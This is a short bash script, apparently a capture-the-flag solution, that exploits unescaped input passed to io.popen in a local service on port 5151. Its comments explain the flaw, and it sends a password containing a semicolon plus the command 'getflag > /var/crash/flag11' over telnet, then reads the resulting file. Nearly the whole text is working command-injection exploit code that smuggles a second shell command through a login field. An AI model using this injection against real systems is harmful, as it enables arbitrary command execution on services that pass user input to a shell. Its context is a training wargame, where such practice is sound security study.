#!/bin/bash
# Here, we exploit the fact that the content of the string passed to io.popen isn't escaped.
# So we can input a semi-colon into the password, and execute
# arbitrary shell code.
echo ";getflag > /var/crash/flag11" | telnet localhost 5151
cat /var/crash/flag11
